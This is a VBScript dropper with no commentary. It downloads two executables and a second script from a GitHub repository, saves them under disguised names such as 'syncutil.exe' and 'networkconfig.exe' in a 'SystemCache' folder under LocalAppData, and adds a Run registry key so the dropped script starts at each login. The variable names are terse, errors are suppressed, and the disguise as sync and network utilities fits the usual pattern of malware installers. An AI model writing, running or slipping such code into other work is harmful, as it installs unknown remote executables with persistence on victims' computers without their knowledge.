Dim a, b, c, d, e, f, g, h, i, j, k

Set a = CreateObject("WinHttp.WinHttpRequest.5.1")
Set b = CreateObject("ADODB.Stream")
Set c = CreateObject("WScript.Shell")
Set d = CreateObject("Scripting.FileSystemObject")

e = "https://github.com/GonzaloSSJ12/Archivos/raw/main/onedrivesync.exe"
f = "https://github.com/GonzaloSSJ12/Archivos/raw/main/conexion.exe"
g = "https://github.com/GonzaloSSJ12/Archivos/raw/main/arranque.vbs"
h = c.ExpandEnvironmentStrings("%LocalAppData%\SystemCache")

If Not d.FolderExists(h) Then
    d.CreateFolder h
End If

i = h & "\syncutil.exe"
If Not d.FileExists(i) Then
    Call DownloadFile(e, i)
End If

i = h & "\networkconfig.exe"
If Not d.FileExists(i) Then
    Call DownloadFile(f, i)
End If

i = h & "\startup.vbs"
If Not d.FileExists(i) Then
    Call DownloadFile(g, i)
End If

j = h & "\startup.vbs"
k = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
If d.FileExists(j) Then
    c.RegWrite k & "StartupScript", Chr(34) & j & Chr(34), "REG_SZ"
End If

Set a = Nothing
Set b = Nothing
Set c = Nothing
Set d = Nothing

Sub DownloadFile(url, filePath)
    On Error Resume Next
    a.Open "GET", url, False
    a.Send
    If a.Status = 200 Then
        Set b = CreateObject("ADODB.Stream")
        b.Open
        b.Type = 1 ' Binario
        b.Write a.ResponseBody
        b.SaveToFile filePath, 2
        b.Close
    End If
    On Error GoTo 0
End Sub
